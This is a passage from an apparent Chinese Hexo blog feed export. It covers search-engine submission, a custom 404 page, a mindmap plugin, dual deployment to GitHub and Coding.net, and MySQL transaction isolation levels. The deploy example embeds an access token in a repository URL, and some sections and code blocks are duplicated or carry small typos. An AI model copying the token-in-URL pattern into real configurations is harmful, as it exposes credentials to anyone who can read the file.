自动收录效果还不错,百度就差得远了(<code>GitHub</code>不允许百度的<code>Spider</code>爬取<code>GitHub</code>上的内容).</p><p><code>hexo-theme-matery</code>主题已经封装了<code>baidu\google</code>的抓取,只需要指定相关的<code>id</code>即可</p></blockquote><h4 id="1-baidu搜索平台"><a href="#1-baidu搜索平台" class="headerlink" title="1.baidu搜索平台"></a>1.<code>baidu</code>搜索平台</h4><blockquote><ol><li>首先登陆<a href="https://ziyuan.baidu.com/?castk=LTE=" target="_blank" rel="noopener">百度搜索平台</a>,点击**<a href="https://ziyuan.baidu.com/site/index" target="_blank" rel="noopener">新增网站</a>**</li></ol><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10186.png" alt="10186"></p><ol start="2"><li>输入自己的网站</li></ol><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10187.png" alt="10187"></p><ol start="3"><li>选择<code>CNAME</code>方式注册网站,先在阿里云中写入百度提供的解析记录,然后等待一段时间,直到能在命令行中<code>ping</code>通记录为止</li></ol><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10188.png" alt="10188"></p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10189.png" alt="10189"></p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10190.png" alt="10190"></p><ol start="4"><li>点击完成验证</li><li>安装<code>sitemap</code></li></ol><pre class="line-numbers language-bash"><code class="language-bash">$  <span class="token function">sudo</span> <span class="token function">npm</span> <span class="token function">install</span> hexo-generator-sitemap --save$  <span class="token function">sudo</span> <span class="token function">npm</span> <span class="token function">install</span> hexo-generator-baidu-sitemap --save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="6"><li>更新<code>hexo</code></li></ol><pre class="line-numbers language-bash"><code class="language-bash">$ vim ./_config<span class="token comment" spellcheck="true"># 指定URL到自己的网站</span>url: https://www.wenyan.online/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash"><code class="language-bash">$ hexo g$ hexo d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="7"><li>点击提交<img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10191.png" alt="10191"></li><li>进入漫长的等待中,只有等待<code>baidu</code>蜘蛛自己去爬取网站内容</li></ol><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10192.png" alt="10192"></p><ol start="9"><li>开启自动推送,打开<code>themes/hexo-theme-matery/_config</code></li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 百度搜索资源平台提交链接</span>baiduPush: <span class="token boolean">true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></blockquote><h4 id="2-baidu统计平台"><a href="#2-baidu统计平台" class="headerlink" title="2.baidu统计平台"></a>2.<code>baidu</code>统计平台</h4><blockquote><ol><li>打开百度统计平台<code>https://tongji.baidu.com</code></li><li>点击新建站点</li></ol><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10185.png" alt="10192"></p><ol start="3"><li>在代码统计中复制自己的<code>id</code>(马赛克部分就是id)</li></ol><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10193.png" alt="10193"></p><ol start="4"><li>打开主题下的配置文件<code>_config</code>,填写相关<code>id</code></li></ol><pre class="line-numbers language-bash"><code class="language-bash">baiduAnalytics:  enable: <span class="token boolean">true</span>  id: <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="5"><li>重新生成静态网站</li></ol><pre class="line-numbers language-bash"><code class="language-bash">$ hexo g$ hexo d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="6"><li>点击<code>代码安装检查</code>,查看是否安装成功</li></ol><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10194.png" alt="10194"></p></blockquote><h4 id="3-google统计平台"><a href="#3-google统计平台" class="headerlink" title="3.google统计平台"></a>3.<code>google</code>统计平台</h4><blockquote><ol><li>访问统计平台<code>https://search.google.com/search-console/welcome?hl=zh-CN</code></li><li>添加自己的网站</li></ol><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10195.png" alt="10195"></p><ol start="3"><li>按照提示添加<code>dns</code>指示</li></ol><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10196.png" alt="10196"></p><p>注意:如果你是阿里云购买的域名,那么<code>CNAME</code>和<code>TXT</code>的<code>@</code>记录是不允许同时存在的.解决方式是,指定<code>TXT</code>记录的解析者为境外,因为这个解析记录主要是为了<code>google</code>抓取而存在的.</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10207.png" alt="10207"></p><ol start="4"><li>在平台中添加自己的<code>sitemap</code>,注意<code>google</code>添加后以后回去自动抓取</li></ol><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10208.png" alt="10208"></p><ol start="5"><li><code>google</code>几乎是秒加,会马上看到成功的字样.</li></ol><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10209.png" alt="10209"></p><ol start="6"><li>然后在<code>google</code>中搜索自己的站点,也会马上看到.</li></ol><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10210.png" alt="10210"></p></blockquote><h4 id="4-bing统计平台"><a href="#4-bing统计平台" class="headerlink" title="4.bing统计平台"></a>4.<code>bing</code>统计平台</h4><blockquote><ol><li>登录<code>https://www.bing.com/webmaster/home/mysites</code></li><li>如果你已经设置了<code>google</code>的站点,<code>bing</code>可以直接导入<code>google</code>的设置即可.</li><li>剩下的就是无尽的等待.等待<code>bing</code>的缓慢收录</li></ol><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10211.png" alt="10211"></p></blockquote><h3 id="14-优化categories分类"><a href="#14-优化categories分类" class="headerlink" title="14.优化categories分类"></a>14.优化<code>categories</code>分类</h3><blockquote><p>修改博客目录下的<code>post.md</code>文件,以后新创建 的博客将增加分类标签<code>categories</code></p><pre><code>❯ vim ./scaffolds/post.md---title: {{ title }}date: {{ date }}author: {{ author }}summary:keywords:categories: img:tags:---</code></pre></blockquote><h3 id="15-新增加404页面"><a href="#15-新增加404页面" class="headerlink" title="15.新增加404页面"></a>15.新增加<code>404</code>页面</h3><blockquote><p>新建<code>/source/404.md</code>,新增加如下内容</p><pre class="line-numbers language-yaml"><code class="language-yaml"><span class="token punctuation">---</span><span class="token key atrule">title</span><span class="token punctuation">:</span> <span class="token number">404</span><span class="token key atrule">date</span><span class="token punctuation">:</span> <span class="token datetime number">2020-09-04 17:25:30</span><span class="token key atrule">type</span><span class="token punctuation">:</span> <span class="token string">"404"</span><span class="token key atrule">layout</span><span class="token punctuation">:</span> <span class="token string">"404"</span><span class="token key atrule">description</span><span class="token punctuation">:</span> <span class="token string">"Oops～，我崩溃了！找不到你想要的页面 :("</span><span class="token punctuation">---</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>效果如图所示:</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-6/1599374913504-10278.png" alt="10278"></p><p>但是,并不好看,所以在网上找了一个好看的.</p><p>导入<code>js</code>文件:</p><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">mkdir</span> themes/hexo-theme-matery/source/lib/my404/$ <span class="token function">cp</span> data.js themes/hexo-theme-matery/source/lib/my404/$ <span class="token function">cp</span> bodymovin.js themes/hexo-theme-matery/source/lib/my404/$ vim themes/hexo-theme-matery/_config.yml<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>增加:</p><pre class="line-numbers language-yaml"><code class="language-yaml"><span class="token key atrule">js</span><span class="token punctuation">:</span> <span class="token key atrule">mydata</span><span class="token punctuation">:</span> /libs/my404/data.js      <span class="token comment" spellcheck="true"># 404 错误js</span> <span class="token key atrule">mybodymovin</span><span class="token punctuation">:</span> /libs/my404/bodymovin.js  <span class="token comment" spellcheck="true"># 404 错误j</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>编辑<code>404.ejs</code>文件</p><pre class="line-numbers language-bash">$ vim  themes/hexo-theme-matery/layout/404.ejs</code></pre><pre><code class="ejs"><code class="language-bash">$ vim  themes/hexo-theme-matery/layout/404.ejs</code></pre><pre><code class="ejs"><style type="text/css"> /* don't remove. */ .page404-cover {     /* height: 75vh; */     height: 88vh; } #svgContainer {     width: 100%;     height: 100%;     background-color: white;     position: absolute;     top: 0;     left: 0;     right: 0;     bottom: 0;     margin: auto; }</style><script src="<%- theme.libs.js.mybodymovin %>"></script><script src="<%- theme.libs.js.mydata %>"></script><div class="bg-cover pd-header page404-cover"> <div id="svgContainer"></div> <script type="text/javascript">     var svgContainer = document.getElementById('svgContainer');     var animItem = bodymovin.loadAnimation({         wrapper: svgContainer,         animType: 'svg',         loop: true,         animationData: JSON.parse(animationData)     }); </script></div><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://wenyan.online/404/" target="_blank" rel="noopener">https://wenyan.online/404/</a></p></blockquote><h3 id="16-使用脑图工具"><a href="#16-使用脑图工具" class="headerlink" title="16.使用脑图工具"></a>16.使用脑图工具</h3><blockquote><pre class="line-numbers language-bash">$ npm install hexo-simple-mindmap</code></pre><p>写新文章时,在需要脑图的地方,如下创建(尺寸有三种规格:<code>mindmap-sm</code>,<code>mindmap-md</code> 和 <code>mindmap-lg</code>)</p><pre><code class="text"><code class="language-bash">$ npm install hexo-simple-mindmap</code></pre><p>写新文章时,在需要脑图的地方,如下创建(尺寸有三种规格:<code>mindmap-sm</code>,<code>mindmap-md</code> 和 <code>mindmap-lg</code>)</p><pre><code class="text">{% pullquote mindmap mindmap-lg %}> > - software> - 思维导图> - 百度脑图> - 输入法> - 搜狗拼音> - 百度输入法> - 个人知识系统> - 为知笔记> - Vnote+坚果云> > {% endpullquote %}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意:不能使用<code>markdown</code>中<code>&gt;</code>缩进显示</p></blockquote><blockquote class="pullquote mindmap mindmap-lg"><ul><li>software<ul><li>思维导图<ul><li>百度脑图</li></ul></li><li>输入法<ul><li>搜狗拼音</li><li>百度输入法</li></ul></li><li>个人知识系统<ul><li>为知笔记</li><li>Vnote+坚果云</li></ul></li></ul></li></ul></blockquote><blockquote><p>参考:<a href="https://hunterx.xyz/hexo-simple-mindmap-plugin-intro.html" target="_blank" rel="noopener">https://hunterx.xyz/hexo-simple-mindmap-plugin-intro.html</a></p></blockquote><h2 id="Hexo双线部署到coding"><a href="#Hexo双线部署到coding" class="headerlink" title="Hexo双线部署到coding"></a><code>Hexo</code>双线部署到<code>coding</code></h2><h3 id="导读"><a href="#导读" class="headerlink" title="导读"></a>导读</h3><blockquote><p>今天突然发现,在使用联通<code>4G</code>流量的情况下,居然不能正常打开<code>github page</code>.会被联通的<code>DNS</code>恶意解析到<code>127.0.0.1</code></p><ul><li>联通<code>DNS</code>解析</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-3/1599139884414-10255.png" alt="10255"></p><ul><li>联通<code>DNS</code>:<code>60.50.246.85</code>,这是典型的<code>DNS</code>劫持.如果你电脑端,是可以通过修改<code>hosts</code>文件的,手机端没有<code>root</code>还有点麻烦.</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-3/1599139884379-10257.png" alt="10257"></p><ul><li>公共<code>DNS</code>解析,可以看到公共解析是没有问题的.</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-3/1599139884410-10256.png" alt="10256"></p><hr><p>为了避免这些情况,决定把<code>HEXO</code>部署在<code>coding</code>上一份,供国内流量访问.</p></blockquote><h3 id="1-申请账户"><a href="#1-申请账户" class="headerlink" title="1.申请账户"></a>1.申请账户</h3><blockquote><p>访问<a href="https://e.coding.net/register?from=dev-tencent" target="_blank" rel="noopener">Coding</a>官网:<code>https://e.coding.net/register?from=dev-tencent</code>,注册一个账户,注意绑定自己的邮箱.</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-3/1599140335723-10258.png" alt="10258"></p></blockquote><h3 id="2-创建新项目"><a href="#2-创建新项目" class="headerlink" title="2.创建新项目"></a>2.创建新项目</h3><blockquote><p>注册完成之后就会进入主页面,然后创建新项目,选择<code>DevOps</code>项目.</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-3/1599140525612-10259.png" alt="10259"></p><p>写入自己的项目名称,可以是用户名,如下:</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-3/1599140638188-10260.png" alt="10260"></p><p>创建好项目后,需要创建一个代码仓库,首先进入项目,然后创建如下:(注意保存自己的仓库地址)</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-3/1599140845085-10261.png" alt="10261"></p></blockquote><h3 id="3-创建ssh公钥"><a href="#3-创建ssh公钥" class="headerlink" title="3.创建ssh公钥"></a>3.创建<code>ssh</code>公钥</h3><blockquote><ul><li>打开自己的公钥文件并复制.</li></ul><pre class="line-numbers language-bash">$ cat ~/.ssh/id_rsa.pub</code></pre><ul><li><p>登录<code>coding</code>,点击左上角的<code>个人设置</code>,选择菜单<code>ssh公钥</code>,点击<code>新增公钥</code>按钮,然后将复制的公钥写入到<code>coding</code>中即可.</p></li><li><p>完成后,在命令好中创建连接,有如下语句,表示连接成功.</p></li></ul><pre><code class="bash"><code class="language-bash">$ cat ~/.ssh/id_rsa.pub</code></pre><ul><li><p>登录<code>coding</code>,点击左上角的<code>个人设置</code>,选择菜单<code>ssh公钥</code>,点击<code>新增公钥</code>按钮,然后将复制的公钥写入到<code>coding</code>中即可.</p></li><li><p>完成后,在命令好中创建连接,有如下语句,表示连接成功.</p></li></ul><pre><code class="bash">$ ssh -T git@e.coding.netningwenyan，你好，你已经通过 SSH 协议认证 Coding.net 服务，这是一个个人公钥.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>如果你么有公钥,尝试用如下命令生成.</li></ul><pre class="line-numbers language-bash">$ ssh-keygen -t rsa -b 4096 -C &quot;your.email@example.com&quot;</code></pre></blockquote><h3 id="4-创建项目令牌"><a href="#4-创建项目令牌" class="headerlink" title="4.创建项目令牌"></a>4.创建项目令牌</h3><blockquote><p>令牌的作用是:后续推送代码操作无需再次输入用户名和密码</p><ul><li>在项目中点击【项目设置】-&gt;【开发者选项】-&gt;【项目令牌】-&gt;【 新增项目令牌】</li><li>输入令牌名称、选择过期时间、勾选令牌权限后即可完成创建</li><li>创建成功后,会有一个用户名和<code>token</code></li></ul><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-3/1599141498642-10262.png" alt="10262"></p></blockquote><h3 id="5-修改HEXO配置文件"><a href="#5-修改HEXO配置文件" class="headerlink" title="5.修改HEXO配置文件"></a>5.修改<code>HEXO</code>配置文件</h3><blockquote><p>修改<code>HEXO</code>博客的主配置文件<code>_config.yml</code>,找到<code>deploy</code>,修改如下</p><pre><code class="yaml"><code class="language-bash">$ ssh-keygen -t rsa -b 4096 -C &quot;your.email@example.com&quot;</code></pre></blockquote><h3 id="4-创建项目令牌"><a href="#4-创建项目令牌" class="headerlink" title="4.创建项目令牌"></a>4.创建项目令牌</h3><blockquote><p>令牌的作用是:后续推送代码操作无需再次输入用户名和密码</p><ul><li>在项目中点击【项目设置】-&gt;【开发者选项】-&gt;【项目令牌】-&gt;【 新增项目令牌】</li><li>输入令牌名称、选择过期时间、勾选令牌权限后即可完成创建</li><li>创建成功后,会有一个用户名和<code>token</code></li></ul><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-3/1599141498642-10262.png" alt="10262"></p></blockquote><h3 id="5-修改HEXO配置文件"><a href="#5-修改HEXO配置文件" class="headerlink" title="5.修改HEXO配置文件"></a>5.修改<code>HEXO</code>配置文件</h3><blockquote><p>修改<code>HEXO</code>博客的主配置文件<code>_config.yml</code>,找到<code>deploy</code>,修改如下</p><pre><code class="yaml">deploy:type: 'git'repository: github:  [你的github地址] coding: https://用户名:token@仓库地址 # 比如: coding: https://JaH:c936bdad9@e.coding.net/ningwenyan/ningwenyan.gitbranch: master<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改完毕后,将内容推送到<code>coding</code></p><pre class="line-numbers language-bash"><code class="language-bash">$ hexo clean$ hexo g$ hexo d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="6-生成静态网站"><a href="#6-生成静态网站" class="headerlink" title="6.生成静态网站"></a>6.生成静态网站</h3><blockquote><p>推送完毕后,登录<code>coding</code>,选择生成静态网站,如下</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-3/1599141908124-10263.png" alt="10263"></p><p>点击生成静态网站,可以选择自动部署,如下:</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-3/1599142021649-10264.png" alt="10264"></p><p>点击保存,然后可以点击立即部署:</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-3/1599142151553-10265.png" alt="10265"></p><p>部署成功后,可以点击访问网址,查看是否创建成功.</p></blockquote><h3 id="7-绑定域名"><a href="#7-绑定域名" class="headerlink" title="7.绑定域名"></a>7.绑定域名</h3><blockquote><p>实现:</p><ul><li>境外:访问<code>wenyan.onlie</code>解析到<code>github</code></li><li>境内:访问<code>wenyan.online</code>解析到<code>coding</code></li></ul><p>由于我使用的阿里云的域名,所有这里设置阿里云的域名解析,如下:</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-3/1599142575049-10266.png" alt="10266"></p><p>然后点击<code>coding</code>上的设置,并绑定<code>wenyan.online</code>地址,勾选强制使用<code>http</code></p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-3/1599142702300-10267.png" alt="10267"><br><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-3/1599142702296-10268.png" alt="10268"></p></blockquote><h3 id="8-测试"><a href="#8-测试" class="headerlink" title="8.测试"></a>8.测试</h3><blockquote><p>打开站长工具<code>http://ping.chinaz.com/</code></p><p>选择海外测试,查看解析到的地址:</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-3/1599142975648-10269.png" alt="10269"></p><p>选择境内测试:</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-3/1599142975643-10270.png" alt="10270"></p><p>手机<code>4G</code>访问</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-3/1599143132253-10271.png" alt="10271"></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/wechat.png" alt="wechat"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL事务</title>
      <link href="/posts/13299.html"/>
      <url>/posts/13299.html</url>
      
        <content type="html"><![CDATA[<h2 id="SQL事务"><a href="#SQL事务" class="headerlink" title="SQL事务"></a><code>SQL</code>事务</h2><h3 id="1-什么是事务"><a href="#1-什么是事务" class="headerlink" title="1.什么是事务"></a>1.什么是事务</h3><blockquote><p>一个数据库的一组操作,必须保证4个特征(<code>ACID</code>):</p><ul><li><code>Atomicitry</code>:原子性,一个事务必须被视为一个而不可分割的最小工作单元.整个事务中的所有操作要么全部提交成功,要么全部失败回滚.对于一个事务,不可能只是执行一部分.</li><li><code>Consistency</code> :一致性,数据库总是从一个一致性状态转换到另外一个一致性状态.</li><li><code>Isolation</code>:隔离性,通常来说,一个事务所有的修改在最终提交以前,对其他事务是不可见的.</li><li><code>Durability</code>:持久性,一旦一个事务提交,则其所做的修改就会永远保存在数据库中,即使系统崩溃,修改的数据也不会丢失(持久性的安全性和刷新日志级别有关系,不同的级别对应不同的数据安全级别).</li></ul><p>以银行账户转账为例:</p><pre class="line-numbers language-mysql"><code class="language-mysql">-- 新建一个银行储户表 create table checking(    customer_id int auto_increment not null,    balance float not null,    primary key (customer_id))engine=Innodb default charset utf8;create table saving(    customer_id int auto_increment not null,    balance float not null,    primary key (customer_id))engine=Innodb default charset utf8;insert into checking values(1, 300.00);insert into saving values(1, 100.00);-- 开始事务start transaction;select * from checking where customer_id=1;update checking set balance=balance-100.00 where customer_id=1;update saving set balance=balance+100.00 where customer_id=1;commit;-- 事务结束select * from saving;select * from checking;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>原子性:<code>customer_id=1</code> 的用户它的转账的钱要么完全提交(表<code>checking</code> 减少100,表<code>saving</code>增加100),要么回滚(两个表都不改变)</p><p>一致性:体现在数据100 不会因为系统处理到表<code>checking</code> 减少100突然崩溃而消失不见,因为事务还没有提交</p><p>隔离性:A操作数据库减少金额,在事务没有提交之前,B操作数据库,看不到表<code>checking</code> 的改变.</p><p>持久性:这个操作会被记录到系统日志中</p><p>注意:<code>mysql</code> 的<code>Innodb</code> 引擎才支持事务,<code>MyISM</code> 是不支持事务的 .</p></blockquote><h3 id="2-隔离性和隔离级别"><a href="#2-隔离性和隔离级别" class="headerlink" title="2.隔离性和隔离级别"></a>2.隔离性和隔离级别</h3><blockquote><p>当并发事务的时候,可能会出现更新丢失``(lost update)<code>,脏读(</code>dirty reads<code>),不可重复读(</code>non-repeatable reads<code>),幻读(</code>phantom reads`) 的问题.</p><p><code>lost update</code>:当两个或多个事务选择统一行数据进行更新时,由于每个事务都不知道其他事务的存在,就会发生丢失更新-最后的更新覆盖了其他事务所做的更新.</p><p><code>dirty reads</code>:一个事务正在对一条记录做修改,在这个事务完成并提交前,这条数据就处于不一致状态.这个时候,另外一个事务也来读取同一条记录,如果不加以控制,第二条事务就读取了这些<code>脏</code> 数据,并据此做了进一步的处理,就会产生未提交的数据依赖关系.这种现象称为<code>dirty reads</code></p><p><code>non-repeatable reads</code> :一个事务在读取某些数据后的某个时间,再次读取以前读过的数据,却发现其读出的数据已经发生了改变,这种现象叫<code>non-repeatable reads</code></p><p><code>phantom reads</code>: 一个事务按相同的查询条件重新读取以前检索过的数据,却发现其他事务插入了满足其查询条件的新数据,这种现象叫<code>phantom reads</code></p><p>幻读和不可重复读的区别:不可重复读的重点是修改,在同一事务中,同样的条件,第一次读的数据和第二次读的数据不一样;幻读的重点在于新增和删除,在同一事务中,同样的条件,第一次和第二次的记录数一样.</p><p>为了解决上面的问题,数据库引入了隔离级别,每一种级别都规定了一个事务中所做的修改.哪些在事务内可见,哪些在事务外可见.低级别的隔离一般支持更高的并发处理,拥有更低的系统开销.</p><p><code>SQL</code> 的事务级别包括:<code>read uncommitted</code>,<code>read committed</code>,<code>repeateable read</code> ,<code>serializable</code>4种级别一次升高.</p><p><code>read uncommited</code>:读未提交</p><ul><li>所有的事务都可以看到其他未提交事务的执行结果</li><li>这个级别会引发<code>dirtry reads</code> ,使得其他事务读取到未提交的数据</li><li>在实际中很少应用,因为性能不比其他隔离级别好,却缺少其他隔离级别的好处</li></ul><p><code>read committed</code>:读已提交</p><ul><li>这是大多数数据库默认的隔离级别(不是<code>Mysql</code>的默认级别)</li><li>它满足了隔离的简单定义:一个事务只能看到已经提交的事务结果</li><li>会产生问题<code>non-repeateable read</code> .这意味者,同一个事务的<code>select</code> 语句看到结果可能不一样.</li></ul><p><code>repeatable read</code>:可重复读</p><ul><li>这是<code>mysql</code> 的默认事务隔离级别</li><li>它确保同一事务的多个实例在并发读取数据时,可以看到同样的结果</li><li>可能出现的问题<code>phantom read</code> ,幻读是指当某个事务在读取某个范围内的记录时,另外一个事务又在该范围内插入了新的记录,之前的事务再次读取该范围的记录时,会产生幻行</li><li><code>InnoDB</code> 和<code>Falcon</code> 存储引擎通过多版本并发控制(<code>MVCC</code> )机制来解决幻读问题;<code>InnoDB</code> 还通过间隙锁来解决幻读问题</li></ul><p><code>serializable</code>:可串行化</p><ul><li>这是最高的隔离级别</li><li>它通过强制事务排序,使之不可能相互冲突,从而解决幻读问题,简单来说,对于同一行记录,<code>read</code> 会加<code>read lock</code> ,<code>write</code> 会加<code>write lock</code> ,当出现读写锁冲突的时候,后访问的事务必须等前一个事务执行完成,才能执行.</li><li>会产生大量的超时现象和锁竞争.</li></ul><p>按照时间顺序在不同的隔离级别下,会显示不同的内容</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/%E7%BB%98%E5%9B%BE%E6%96%87%E4%BB%B6.png" alt="绘图文件"></p><ul><li>读未提交:事务2的<code>id</code> 在<code>time1</code> 值为2 ,虽然事务1没有提交,但是级别定义的原因,<code>time2\time3</code>值都是2</li><li>读已提交:事务2的<code>id</code> 在<code>time1</code> 值为1,一个事务只能看到已经提交的结果<code>time2\time3</code> 值为2</li><li>可重复读:事务2的<code>id</code> 在<code>time1</code> 值为1,<code>time2</code> 的值也是1,因为事务在执行期间看到的结果必须是一直的,<code>time3</code> 是2</li><li>串行化:事务1在执行<code>id=id+1</code> 时就会被锁住,直到事务2提交后,事务1才会执行,所以<code>time1\time2</code> 的值为1,<code>time3</code>的值为2</li></ul><p>查看<code>mysql</code>的默认隔离级别</p><pre class="line-numbers language-mysql"><code class="language-mysql">mysql root@192.168.101:test> show variables like 'transaction_isolation';       +-----------------------+-----------------+| Variable_name         | Value           |+-----------------------+-----------------+| transaction_isolation | REPEATABLE-READ |+-----------------------+-----------------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="3-事务隔离的实现"><a href="#3-事务隔离的实现" class="headerlink" title="3.事务隔离的实现"></a>3.事务隔离的实现</h3><blockquote><p>在<code>mysql</code>中,可重复事务隔离的实现</p></blockquote><h4 id="1-事务控制语句"><a href="#1-事务控制语句" class="headerlink" title="1.事务控制语句"></a>1.事务控制语句</h4><blockquote><p>在<code>mysql</code> 命令行的默认设置下,事务都是自动提交的,也就是执行完一行<code>SQL</code> 语句后,就会马上执行<code>commit</code> 语句.</p><p>禁止当前会话的自动提交</p><ul><li><code>set autocommit=0</code>: 这个命令会将这个线程的自动提交关掉,意味着执行的<code>SQL</code> 命令在最后关闭连接的时候需要<code>commit</code> 提交才生效.</li></ul><p>可以显式的开启一个事务:</p><ul><li><p><code>begin/start transaction</code> :显式的开启一个事务,但不是一个事务的起点,起点是执行的第一条<code>SQL</code> 语句.这种启动方式,一致性视图是(快照)在执行的第一个<code>SQL</code> 语句的时候创建的.</p></li><li><p><code>start transaction with consistent snapshot</code> :显式的开启一个事务,一致性视图(快照)立刻创建.</p></li></ul><p>提交事务</p><ul><li><code>commit</code>:对数据库做的修改称为永久性的.</li></ul><p>回滚事务:</p><ul><li><code>rollback</code> :回滚会结束用户的事务,并撤销正在进行的所有未提交的修改.</li></ul><p>保存点(子事务):</p><ul><li><code>savepoint savepoint_name</code> :创建一个保存点,一个事务可以有多个保存点.</li><li><code>release savepoint savepoint_name</code> :删除一个事务的保存点,没有指定名字的时候,会报错</li><li><code>rollback to savepoint_name</code>:将事务回滚到标记点.</li></ul><p>设置事务的隔离级别:</p><ul><li><code>set transcation 级别名称</code></li></ul></blockquote><h4 id="2-验证可重复读的现象"><a href="#2-验证可重复读的现象" class="headerlink" title="2.验证可重复读的现象"></a>2.验证可重复读的现象</h4><blockquote><p><code>repeatable read</code>: 同一个事务的多次实例(比如多次查询语句)看到的结果是相同的.同时存在着幻读的情况.</p><p>创建一张测试表<code>transcation_test</code></p><pre class="line-numbers language-mysql"><code class="language-mysql">-- 创建 事务测试表 use test;CREATE TABLE transaction_test (id INT NOT NULL,k INT DEFAULT NULL,PRIMARY KEY (id))  ENGINE=INNODB DEFAULT CHARSET UTF8;-- 插入数据 INSERT INTO transcation_test VALUES(1,1),(2,2);SELECT * FROM transaction_test;-- 表内容+----+---+| id   |   k  |+----+---+| 1    |   1 || 2    |   2 |+----+---+<span aria-hidden="true" 